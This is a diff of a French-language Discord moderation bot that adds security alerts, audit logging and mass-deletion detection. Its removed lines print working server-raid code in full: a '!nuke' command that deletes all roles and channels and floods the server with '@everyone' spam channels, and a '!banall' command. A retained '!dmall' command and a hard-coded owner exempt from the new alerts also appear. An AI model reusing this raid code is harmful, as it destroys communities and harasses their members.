@@ -1,4 +1,4 @@
-// Build Revision: K2L-Bot-Ultra-Fortress-v35.0
+// Build Revision: K2L-Bot-Ultra-Fortress-v36.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, AuditLogEvent, ActivityType } = require('discord.js');
 const http = require('http');
 const fs = require('fs');
@@ -7,7 +7,7 @@ const path = require('path');
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultra Fortress Operational v35.0!\n');
+    res.end('K2L Bot Ultra Fortress Operational v36.0!\n');
 }).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));
 
 const client = new Client({
@@ -30,11 +30,12 @@ const DATA_FILE = path.join(DATA_DIR, 'bot-data.json');
 const snipeCache = new Map();
 const spamTracker = new Map();
 const raidJoinTracker = new Map();
+const nukeChannelDeleteTracker = new Map();
+const nukeRoleDeleteTracker = new Map();
 const serverConfig = new Map();
 const guildStaffConfig = new Map();
 const warningsMap = new Map();
 const jailDataMap = new Map();
-const activeNukes = new Map();
 
 // Super Owner unique et absolu
 const SUPER_OWNER_ID = "1166445202148442112";
@@ -194,6 +195,7 @@ function getGuildConfig(guildId) {
                 roleId: null
             },
             logChannel: null,
+            alertRoleId: null,
             welcomeChannel: null,
             welcomeText: null,
             autopingChannels: [],
@@ -221,6 +223,7 @@ function getGuildConfig(guildId) {
     if (!cfg.soutien) {
         cfg.soutien = { enabled: false, text: null, roleId: null };
     }
+    if (!('alertRoleId' in cfg)) cfg.alertRoleId = null;
     if (!cfg.rolePanel) {
         cfg.rolePanel = {
             channelId: null,
@@ -234,24 +237,33 @@ function getGuildConfig(guildId) {
     }
     return cfg;
 }
-function sendLog(guild, embed) {
+function sendLog(guild, embed, pingAlertRole = false) {
     if (!guild) return;
     const config = getGuildConfig(guild.id);
     if (!config.logChannel) return;
     const logChan = guild.channels.cache.get(config.logChannel);
-    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
+    if (!logChan || !logChan.isTextBased()) return;
+
+    const payload = { embeds: [embed] };
+    if (pingAlertRole && config.alertRoleId && guild.roles.cache.has(config.alertRoleId)) {
+        payload.content = `<@&${config.alertRoleId}> 🚨 **ALERTE SÉCURITÉ**`;
+        payload.allowedMentions = { roles: [config.alertRoleId] };
+    }
+    logChan.send(payload).catch(() => {});
 }
 
-async function fetchAuditExecutor(guild, auditType, targetId = null) {
+async function fetchAuditExecutor(guild, auditType, predicateFn = null) {
     try {
-        const logs = await guild.fetchAuditLogs({ limit: 5, type: auditType });
+        const logs = await guild.fetchAuditLogs({ limit: 8, type: auditType });
         const now = Date.now();
-        const entry = logs.entries.find(e => {
-            const recent = (now - e.createdTimestamp) < 10000;
-            if (!targetId) return recent;
-            return recent && e.target && e.target.id === targetId;
-        }) || logs.entries.first();
-        return entry ? entry.executor : null;
+        for (const [, entry] of logs.entries) {
+            if ((now - entry.createdTimestamp) > 12000) continue;
+            if (!entry.executor) continue;
+            if (!predicateFn || predicateFn(entry)) {
+                return entry.executor;
+            }
+        }
+        return null;
     } catch (e) {
         return null;
     }
@@ -393,7 +405,6 @@ async function executeAutoSanction(guild, member, action, reason) {
         }
     } catch (e) {}
 }
-
 client.on('presenceUpdate', async (oldPresence, newPresence) => {
     try {
         const guild = newPresence?.guild || oldPresence?.guild;
@@ -409,9 +420,10 @@ client.on('presenceUpdate', async (oldPresence, newPresence) => {
         await applySoutienRoleToMember(guild, member, newPresence || oldPresence, config.soutien);
     } catch (e) {}
 });
+
 client.on('messageDelete', async message => {
     if (!message.guild) return;
-    const authorTag = message.author ? message.author.tag : 'Inconnu / Cache expiré';
+    const authorTag = message.author ? message.author.tag : 'Auteur inconnu (hors cache)';
     const authorId = message.author ? message.author.id : 'Inconnu';
     const isBotMsg = message.author ? message.author.bot : false;
 
@@ -424,19 +436,37 @@ client.on('messageDelete', async message => {
         });
     }
 
-    const executor = await fetchAuditExecutor(message.guild, AuditLogEvent.MessageDelete, authorId !== 'Inconnu' ? authorId : null);
+    let deleterInfo = 'Auteur lui-même ou expiration de cache';
+    if (authorId !== 'Inconnu') {
+        const auditExecutor = await fetchAuditExecutor(
+            message.guild,
+            AuditLogEvent.MessageDelete,
+            entry => entry.target && entry.target.id === authorId && entry.extra && entry.extra.channel && entry.extra.channel.id === message.channel.id
+        );
+        if (auditExecutor) {
+            deleterInfo = `${auditExecutor.tag} (\`${auditExecutor.id}\`)`;
+        } else if (message.author) {
+            deleterInfo = `${message.author.tag} (\`${message.author.id}\` - suppression propre)`;
+        }
+    }
+
+    const attachmentsList = message.attachments && message.attachments.size > 0
+        ? message.attachments.map(a => `[${a.name}](${a.url})`).join(', ')
+        : 'Aucune pièce jointe';
 
     const embed = new EmbedBuilder()
         .setColor('#e74c3c')
-        .setTitle('🗑️ Message supprimé (Alerte Sécurité)')
-        .setDescription(
-            `**Auteur du message :** ${authorTag} (\`${authorId}\`)\n` +
-            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Auteur ou modérateur (Audit)'}\n` +
-            `**Salon :** <#${message.channel.id}> (\`${message.channel.id}\`)\n` +
-            `**Contenu supprimé :**\n\`\`\`${message.content || 'Aucun texte / Média ou Embed'}\`\`\``
+        .setTitle('🗑️ Message supprimé')
+        .addFields(
+            { name: '✍️ Auteur', value: `${authorTag}\n\`${authorId}\``, inline: true },
+            { name: '🛡️ Action / Responsable', value: deleterInfo, inline: true },
+            { name: '📍 Salon', value: `<#${message.channel.id}>\n\`${message.channel.id}\``, inline: true },
+            { name: '📎 Pièces jointes', value: attachmentsList, inline: false },
+            { name: '💬 Contenu', value: `\`\`\`${(message.content || 'Aucun contenu texte / Embed seul').slice(0, 1000)}\`\`\``, inline: false }
         )
+        .setFooter({ text: `ID Message : ${message.id}` })
         .setTimestamp();
-    sendLog(message.guild, embed);
+    sendLog(message.guild, embed, false);
 });
 
 client.on('messageUpdate', (oldMessage, newMessage) => {
@@ -446,117 +476,175 @@ client.on('messageUpdate', (oldMessage, newMessage) => {
     const embed = new EmbedBuilder()
         .setColor('#f39c12')
         .setTitle('✏️ Message modifié')
-        .setDescription(
-            `**Auteur :** ${oldMessage.author.tag} (\`${oldMessage.author.id}\`)\n` +
-            `**Salon :** <#${oldMessage.channel.id}>\n` +
-            `**Avant :** \`${oldMessage.content || 'N/A'}\`\n` +
-            `**Après :** \`${newMessage.content || 'N/A'}\``
+        .addFields(
+            { name: '✍️ Auteur', value: `${oldMessage.author.tag} (\`${oldMessage.author.id}\`)`, inline: true },
+            { name: '📍 Salon', value: `<#${oldMessage.channel.id}>`, inline: true },
+            { name: '🔗 Lien', value: newMessage.url ? `[Aller au message](${newMessage.url})` : 'Indisponible', inline: true },
+            { name: '⬅️ Avant', value: `\`\`\`${(oldMessage.content || 'N/A').slice(0, 950)}\`\`\``, inline: false },
+            { name: '➡️ Après', value: `\`\`\`${(newMessage.content || 'N/A').slice(0, 950)}\`\`\``, inline: false }
         )
+        .setFooter({ text: `ID Message : ${oldMessage.id}` })
         .setTimestamp();
-    sendLog(oldMessage.guild, embed);
+    sendLog(oldMessage.guild, embed, false);
 });
-
 client.on('guildBanAdd', async ban => {
-    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanAdd, ban.user.id);
+    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanAdd, entry => entry.target && entry.target.id === ban.user.id);
     const embed = new EmbedBuilder()
         .setColor('#c0392b')
         .setTitle('🔨 Membre banni')
-        .setDescription(
-            `**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)\n` +
-            `**Par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .addFields(
+            { name: '👤 Utilisateur', value: `${ban.user.tag} (\`${ban.user.id}\`)`, inline: true },
+            { name: '👮 Par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Audit / Auto', inline: true },
+            { name: '📄 Raison', value: ban.reason || 'Aucune raison spécifiée', inline: false }
         )
         .setTimestamp();
-    sendLog(ban.guild, embed);
+    sendLog(ban.guild, embed, false);
 });
 
 client.on('guildBanRemove', async ban => {
-    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanRemove, ban.user.id);
+    const executor = await fetchAuditExecutor(ban.guild, AuditLogEvent.MemberBanRemove, entry => entry.target && entry.target.id === ban.user.id);
     const embed = new EmbedBuilder()
         .setColor('#2ecc71')
         .setTitle('🔓 Membre débanni')
-        .setDescription(
-            `**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)\n` +
-            `**Par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .addFields(
+            { name: '👤 Utilisateur', value: `${ban.user.tag} (\`${ban.user.id}\`)`, inline: true },
+            { name: '👮 Par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Audit / Auto', inline: true }
         )
         .setTimestamp();
-    sendLog(ban.guild, embed);
+    sendLog(ban.guild, embed, false);
+});
+
+client.on('guildMemberRemove', async member => {
+    if (!member.guild) return;
+    const kickExecutor = await fetchAuditExecutor(member.guild, AuditLogEvent.MemberKick, entry => entry.target && entry.target.id === member.id);
+    const rolesList = member.roles.cache.filter(r => r.id !== member.guild.id).map(r => `<@&${r.id}>`).slice(0, 12).join(', ') || 'Aucun';
+    const embed = new EmbedBuilder()
+        .setColor(kickExecutor ? '#e67e22' : '#95a5a6')
+        .setTitle(kickExecutor ? '👢 Membre expulsé (Kick)' : '🚪 Membre parti')
+        .addFields(
+            { name: '👤 Membre', value: `${member.user.tag} (\`${member.id}\`)`, inline: true },
+            { name: '👮 Expulsé par', value: kickExecutor ? `${kickExecutor.tag} (\`${kickExecutor.id}\`)` : 'Départ volontaire / Ban', inline: true },
+            { name: '👥 Membres restants', value: `\`${member.guild.memberCount}\``, inline: true },
+            { name: '🏷️ Rôles possédés', value: rolesList, inline: false }
+        )
+        .setTimestamp();
+    sendLog(member.guild, embed, false);
+});
+
+client.on('guildMemberUpdate', async (oldMember, newMember) => {
+    if (!newMember.guild) return;
+    const addedRoles = newMember.roles.cache.filter(r => !oldMember.roles.cache.has(r.id));
+    const removedRoles = oldMember.roles.cache.filter(r => !newMember.roles.cache.has(r.id));
+
+    if (addedRoles.size > 0 || removedRoles.size > 0) {
+        const executor = await fetchAuditExecutor(newMember.guild, AuditLogEvent.MemberRoleUpdate, entry => entry.target && entry.target.id === newMember.id);
+        const desc = [];
+        if (addedRoles.size > 0) desc.push(`➕ **Ajoutés :** ${addedRoles.map(r => `<@&${r.id}>`).join(', ')}`);
+        if (removedRoles.size > 0) desc.push(`➖ **Retirés :** ${removedRoles.map(r => `<@&${r.id}>`).join(', ')}`);
+        desc.push(`👮 **Par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Bot / Système'}`);
+
+        const embed = new EmbedBuilder()
+            .setColor('#5865f2')
+            .setTitle('🎭 Mise à jour des rôles membre')
+            .setDescription(`**Membre :** ${newMember.user.tag} (\`${newMember.id}\`)\n${desc.join('\n')}`)
+            .setTimestamp();
+        sendLog(newMember.guild, embed, false);
+    }
 });
 
 client.on('channelCreate', async channel => {
     if (!channel.guild) return;
-    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelCreate, channel.id);
+    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelCreate, entry => entry.target && entry.target.id === channel.id);
     const embed = new EmbedBuilder()
         .setColor('#3498db')
         .setTitle('📁 Salon créé')
-        .setDescription(
-            `**Nom :** \`${channel.name}\` (\`${channel.id}\`)\n` +
-            `**Créé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .addFields(
+            { name: '📝 Nom', value: `${channel} (\`${channel.name}\`)`, inline: true },
+            { name: '🆔 ID', value: `\`${channel.id}\``, inline: true },
+            { name: '👮 Créé par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
         )
         .setTimestamp();
-    sendLog(channel.guild, embed);
+    sendLog(channel.guild, embed, false);
 });
 
 client.on('channelDelete', async channel => {
     if (!channel.guild) return;
-    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelDelete, channel.id);
+    const executor = await fetchAuditExecutor(channel.guild, AuditLogEvent.ChannelDelete, entry => entry.target && entry.target.id === channel.id);
+    const now = Date.now();
+    let delList = nukeChannelDeleteTracker.get(channel.guild.id) || [];
+    delList = delList.filter(t => now - t < 10000);
+    delList.push(now);
+    nukeChannelDeleteTracker.set(channel.guild.id, delList);
+
+    const isMassDelete = delList.length >= 4 && (!executor || !isSuperOwnerById(executor.id, executor.username, executor.globalName));
+
     const embed = new EmbedBuilder()
-        .setColor('#e74c3c')
-        .setTitle('🗑️ Salon supprimé')
-        .setDescription(
-            `**Nom :** \`${channel.name}\` (\`${channel.id}\`)\n` +
-            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .setColor(isMassDelete ? '#ff0044' : '#e74c3c')
+        .setTitle(isMassDelete ? '🚨 ALERTE SÉCURITÉ — SUPPRESSION MASSIVE DE SALONS' : '🗑️ Salon supprimé')
+        .addFields(
+            { name: '📝 Nom', value: `\`${channel.name}\``, inline: true },
+            { name: '🆔 ID', value: `\`${channel.id}\``, inline: true },
+            { name: '👮 Supprimé par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
         )
         .setTimestamp();
-    sendLog(channel.guild, embed);
+    sendLog(channel.guild, embed, isMassDelete);
 });
 
 client.on('roleCreate', async role => {
-    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleCreate, role.id);
+    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleCreate, entry => entry.target && entry.target.id === role.id);
     const embed = new EmbedBuilder()
         .setColor('#9b59b6')
         .setTitle('🏷️ Rôle créé')
-        .setDescription(
-            `**Nom :** \`${role.name}\` (\`${role.id}\`)\n` +
-            `**Créé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .addFields(
+            { name: '📝 Nom', value: `${role} (\`${role.name}\`)`, inline: true },
+            { name: '🆔 ID', value: `\`${role.id}\``, inline: true },
+            { name: '👮 Créé par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
         )
         .setTimestamp();
-    sendLog(role.guild, embed);
+    sendLog(role.guild, embed, false);
 });
 
 client.on('roleDelete', async role => {
-    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleDelete, role.id);
+    const executor = await fetchAuditExecutor(role.guild, AuditLogEvent.RoleDelete, entry => entry.target && entry.target.id === role.id);
+    const now = Date.now();
+    let delRoles = nukeRoleDeleteTracker.get(role.guild.id) || [];
+    delRoles = delRoles.filter(t => now - t < 10000);
+    delRoles.push(now);
+    nukeRoleDeleteTracker.set(role.guild.id, delRoles);
+
+    const isMassRoleDelete = delRoles.length >= 4 && (!executor || !isSuperOwnerById(executor.id, executor.username, executor.globalName));
+
     const embed = new EmbedBuilder()
-        .setColor('#e74c3c')
-        .setTitle('🗑️ Rôle supprimé')
-        .setDescription(
-            `**Nom :** \`${role.name}\` (\`${role.id}\`)\n` +
-            `**Supprimé par :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+        .setColor(isMassRoleDelete ? '#ff0044' : '#e74c3c')
+        .setTitle(isMassRoleDelete ? '🚨 ALERTE SÉCURITÉ — SUPPRESSION MASSIVE DE RÔLES' : '🗑️ Rôle supprimé')
+        .addFields(
+            { name: '📝 Nom', value: `\`${role.name}\``, inline: true },
+            { name: '🆔 ID', value: `\`${role.id}\``, inline: true },
+            { name: '👮 Supprimé par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
         )
         .setTimestamp();
-    sendLog(role.guild, embed);
+    sendLog(role.guild, embed, isMassRoleDelete);
 });
 
 client.on('guildUpdate', async (oldGuild, newGuild) => {
-    const config = getGuildConfig(newGuild.id);
     if (oldGuild.vanityURLCode !== newGuild.vanityURLCode) {
-        const executor = await fetchAuditExecutor(newGuild, AuditLogEvent.GuildUpdate, newGuild.id);
+        const executor = await fetchAuditExecutor(newGuild, AuditLogEvent.GuildUpdate);
         const embed = new EmbedBuilder()
             .setColor('#ff0044')
-            .setTitle('🚨 ALERTE URL / SERVEUR MODIFIÉ')
-            .setDescription(
-                `**Ancienne URL :** \`${oldGuild.vanityURLCode || 'Aucune'}\`\n` +
-                `**Nouvelle URL :** \`${newGuild.vanityURLCode || 'Aucune'}\`\n` +
-                `**Auteur :** ${executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu'}`
+            .setTitle('🚨 ALERTE SÉCURITÉ — URL / SERVEUR MODIFIÉ')
+            .addFields(
+                { name: '⬅️ Ancienne URL', value: `\`${oldGuild.vanityURLCode || 'Aucune'}\``, inline: true },
+                { name: '➡️ Nouvelle URL', value: `\`${newGuild.vanityURLCode || 'Aucune'}\``, inline: true },
+                { name: '👮 Auteur', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
             )
             .setTimestamp();
-        sendLog(newGuild, embed);
+        sendLog(newGuild, embed, true);
     }
 });
 
 client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
-
 client.on('guildMemberAdd', async member => {
     const config = getGuildConfig(member.guild.id);
 
@@ -572,10 +660,10 @@ client.on('guildMemberAdd', async member => {
                 await member.kick('Anti-Raid activé : arrivée massive détectée').catch(() => {});
                 const raidEmbed = new EmbedBuilder()
                     .setColor('#ff0044')
-                    .setTitle('🚨 ANTI-RAID DÉCLENCHÉ')
-                    .setDescription(`Membre expulsé automatiquement : ${member.user.tag} (\`${member.id}\`)`)
+                    .setTitle('🚨 ALERTE SÉCURITÉ — ANTI-RAID DÉCLENCHÉ')
+                    .setDescription(`Membre expulsé automatiquement : **${member.user.tag}** (\`${member.id}\`)`)
                     .setTimestamp();
-                sendLog(member.guild, raidEmbed);
+                sendLog(member.guild, raidEmbed, true);
                 return;
             }
         }
@@ -591,33 +679,63 @@ client.on('guildMemberAdd', async member => {
     }
 
     if (member.user.bot && member.id !== client.user.id) {
+        let executor = null;
+        try {
+            const fetchedLogs = await member.guild.fetchAuditLogs({ limit: 5, type: AuditLogEvent.BotAdd });
+            const entry = fetchedLogs.entries.find(e => e.target && e.target.id === member.id && (Date.now() - e.createdTimestamp) < 15000) || fetchedLogs.entries.first();
+            executor = entry ? entry.executor : null;
+        } catch (err) {}
+
         if (config.antibot) {
-            try {
-                const fetchedLogs = await member.guild.fetchAuditLogs({ limit: 1, type: 28 });
-                const auditLog = fetchedLogs.entries.first();
-                const executor = auditLog ? auditLog.executor : null;
+            const isExecutorSuperOwner = executor ? isSuperOwnerById(executor.id, executor.username, executor.globalName) : false;
 
-                const isExecutorSuperOwner = executor ? isSuperOwnerById(executor.id, executor.username, executor.globalName) : false;
+            if (!isExecutorSuperOwner) {
+                await member.kick('Anti-bot activé.').catch(() => {});
 
-                if (!isExecutorSuperOwner) {
-                    await member.kick('Anti-bot activé.');
-
-                    if (executor && !executor.bot) {
-                        const execMember = await member.guild.members.fetch(executor.id).catch(() => null);
-                        if (execMember) {
-                            await executeAutoSanction(member.guild, execMember, config.antibotAction, 'Anti-Bot: Ajout de bot interdit');
-                        }
+                if (executor && !executor.bot) {
+                    const execMember = await member.guild.members.fetch(executor.id).catch(() => null);
+                    if (execMember) {
+                        await executeAutoSanction(member.guild, execMember, config.antibotAction, 'Anti-Bot: Ajout de bot interdit');
                     }
-
-                    const embed = new EmbedBuilder()
-                        .setColor('#e74c3c')
-                        .setTitle('🤖 Bot bloqué (Anti-bot)')
-                        .setDescription(`**Bot expulsé :** ${member.user.tag} (\`${member.id}\`)\n**Inviteur :** ${executor ? executor.tag : 'Inconnu'}\n**Sanction :** \`${config.antibotAction}\``)
-                        .setTimestamp();
-                    sendLog(member.guild, embed);
                 }
-            } catch (err) {}
+
+                const alertEmbed = new EmbedBuilder()
+                    .setColor('#ff0044')
+                    .setTitle('🚨 ALERTE SÉCURITÉ — ANTI-BOT DÉCLENCHÉ')
+                    .addFields(
+                        { name: '🤖 Bot bloqué / expulsé', value: `${member.user.tag}\n\`${member.id}\``, inline: true },
+                        { name: '🚨 Déclenché / ajouté par', value: executor ? `${executor.tag}\n\`${executor.id}\`` : 'Inconnu', inline: true },
+                        { name: '⚖️ Sanction', value: `\`${config.antibotAction}\``, inline: true }
+                    )
+                    .setTimestamp();
+                sendLog(member.guild, alertEmbed, true);
+                return;
+            }
+        } else {
+            const botJoinEmbed = new EmbedBuilder()
+                .setColor('#f39c12')
+                .setTitle('🤖 Nouveau bot ajouté sur le serveur')
+                .addFields(
+                    { name: '🤖 Bot', value: `${member.user.tag} (\`${member.id}\`)`, inline: true },
+                    { name: '👤 Ajouté par', value: executor ? `${executor.tag} (\`${executor.id}\`)` : 'Inconnu', inline: true }
+                )
+                .setTimestamp();
+            sendLog(member.guild, botJoinEmbed, false);
         }
+    }
+
+    if (!member.user.bot) {
+        const accountAgeDays = Math.floor((Date.now() - member.user.createdTimestamp) / (1000 * 60 * 60 * 24));
+        const joinEmbed = new EmbedBuilder()
+            .setColor('#2ecc71')
+            .setTitle('📥 Nouveau membre')
+            .addFields(
+                { name: '👤 Membre', value: `${member.user.tag} (\`${member.id}\`)`, inline: true },
+                { name: '📅 Âge du compte', value: `\`${accountAgeDays} jour(s)\``, inline: true },
+                { name: '👥 Total membres', value: `\`${member.guild.memberCount}\``, inline: true }
+            )
+            .setTimestamp();
+        sendLog(member.guild, joinEmbed, false);
     }
 
     if (Array.isArray(config.autopingChannels) && config.autopingChannels.length > 0) {
@@ -780,14 +898,13 @@ client.on('interactionCreate', async interaction => {
                 .setTitle('🎫 Ticket ouvert')
                 .setDescription(`**Membre :** ${member.user.tag} (\`${member.user.id}\`)\n**Salon :** ${ticketChannel}\n**Type :** \`${catObj.name}\`${catObj.roleId ? `\n**Rôle notifié :** <@&${catObj.roleId}>` : ''}`)
                 .setTimestamp();
-            sendLog(guild, logEmbed);
+            sendLog(guild, logEmbed, false);
 
             return interaction.editReply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}` });
         } catch (e) {
             return interaction.editReply({ content: "❌ Erreur lors de la création du salon de ticket." });
         }
     }
-
     if (interaction.isButton()) {
         const guild = interaction.guild;
         const config = getGuildConfig(guild.id);
@@ -841,7 +958,7 @@ client.on('interactionCreate', async interaction => {
                     const logChan = guild.channels.cache.get(tConfig.logChannel);
                     if (logChan) await logChan.send({ embeds: [logEmbed], files: [attachment] });
                 } else {
-                    sendLog(guild, logEmbed);
+                    sendLog(guild, logEmbed, false);
                 }
             } catch (err) {}
 
@@ -961,85 +1078,6 @@ client.on('messageCreate', async message => {
 
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
-        
-        if (command === 'stop') {
-            if (activeNukes.has(message.guild.id)) {
-                clearInterval(activeNukes.get(message.guild.id));
-                activeNukes.delete(message.guild.id);
-                return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
-            }
-            return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
-        }
-
-        if (command === 'nuke') {
-            await message.reply("⚡ **[NUKE]** Destruction totale, flood infini de salons/rôles et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
-            
-            message.guild.roles.cache
-                .filter(role => role.editable && role.id !== message.guild.id)
-                .forEach(role => role.delete().catch(() => {}));
-            for (let r = 0; r < 40; r++) {
-                message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
-            }
-
-            message.guild.members.fetch().then(fetchedMembers => {
-                for (const [id, m] of fetchedMembers) {
-                    if (m.user.bot && m.id !== client.user.id) {
-                        m.kick('Kickbot').catch(() => {});
-                    }
-                }
-            }).catch(() => {});
-
-            message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
-
-            if (activeNukes.has(message.guild.id)) {
-                clearInterval(activeNukes.get(message.guild.id));
-            }
-
-            const nukeInterval = setInterval(async () => {
-                try {
-                    const channelPromises = [];
-                    for (let i = 0; i < 6; i++) {
-                        channelPromises.push(
-                            message.guild.channels.create({
-                                name: 'ez-by-k2l',
-                                type: ChannelType.GuildText,
-                                permissionOverwrites: [{
-                                    id: message.guild.id,
-                                    allow: [
-                                        PermissionsBitField.Flags.ViewChannel,
-                                        PermissionsBitField.Flags.SendMessages,
-                                        PermissionsBitField.Flags.ManageChannels,
-                                        PermissionsBitField.Flags.EmbedLinks,
-                                        PermissionsBitField.Flags.AttachFiles,
-                                        PermissionsBitField.Flags.MentionEveryone
-                                    ]
-                                }]
-                            }).then(async channel => {
-                                for (let j = 0; j < 6; j++) {
-                                    await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
-                                }
-                            }).catch(() => {})
-                        );
-                    }
-                    await Promise.all(channelPromises);
-                } catch (err) {}
-            }, 250);
-
-            activeNukes.set(message.guild.id, nukeInterval);
-            return;
-        }
-
-        if (command === 'banall') {
-            await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
-            try {
-                await message.guild.members.fetch();
-                const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
-                const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
-                await Promise.all(banPromises);
-                message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
-            } catch (error) {}
-            return;
-        }
 
         if (command === 'dmall') {
             await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
@@ -1134,6 +1172,7 @@ client.on('messageCreate', async message => {
             }
             return;
         }
+        return;
     }
 
     const config = getGuildConfig(message.guild.id);
@@ -1238,8 +1277,9 @@ client.on('messageCreate', async message => {
                     '`=setantilink <action>`\n┗ Sanction anti-lien',
                     '`=antispam on / off`\n┗ Anti-spam',
                     '`=setantispam <action>`\n┗ Sanction anti-spam',
-                    '`=antibot on / off`\n┗ Anti-bot',
+                    '`=antibot on / off`\n┗ Anti-bot (Alerte Sécurité)',
                     '`=setantibot <action>`\n┗ Sanction anti-bot',
+                    '`=setalertrole <@rôle|ID|none>`\n┗ Rôle ping sur Alertes Sécurité',
                     '`=antiraid <on|off|status>`\n┗ Anti-raid automatique',
                     '`=lockdown <on|off>`\n┗ Verrouillage général d\'urgence'
                 ]
@@ -1366,7 +1406,6 @@ client.on('messageCreate', async message => {
         collector.on('end', () => sentMsg.edit({ components: [] }).catch(() => {}));
         return;
     }
-
     if (command === 'soutien') {
         if (!requireRank(3)) return;
         const sub = args[0]?.toLowerCase();
@@ -1574,7 +1613,6 @@ client.on('messageCreate', async message => {
         }
         return message.reply(sub === 'on' ? `🔒 **LOCKDOWN ACTIVÉ** sur ${count} salons textuels.` : `🔓 **LOCKDOWN DÉSACTIVÉ** sur ${count} salons textuels.`);
     }
-
     if (command === 'autoping') {
         if (!requireRank(3)) return;
         const sub = args[0]?.toLowerCase();
@@ -1696,6 +1734,21 @@ client.on('messageCreate', async message => {
         saveBotData();
         return message.reply(`🛡️ Sanction Anti-Bot mise à jour : \`${action}\``);
     }
+
+    if (command === 'setalertrole') {
+        if (!requireRank(3)) return;
+        if (!targetArg || targetArg.toLowerCase() === 'none' || targetArg.toLowerCase() === 'off') {
+            config.alertRoleId = null;
+            saveBotData();
+            return message.reply("✅ Rôle d'alerte sécurité retiré.");
+        }
+        const role = await fetchTargetRole(message, targetArg);
+        if (!role) return message.reply("Utilisation : `=setalertrole <@rôle|ID|none>`");
+        config.alertRoleId = role.id;
+        saveBotData();
+        return message.reply(`🚨 Rôle d'alerte sécurité défini sur <@&${role.id}> (pingé lors des alertes sécurité dans les logs).`);
+    }
+
     if (command === 'gay') {
         const target = message.mentions.users.first() || message.author;
         const percent = Math.floor(Math.random() * 101);
@@ -1804,7 +1857,6 @@ client.on('messageCreate', async message => {
         const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
         return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Owners').setDescription(ownerList)] });
     }
-
     if (command === 'stats') {
         const guild = message.guild;
         await guild.members.fetch();
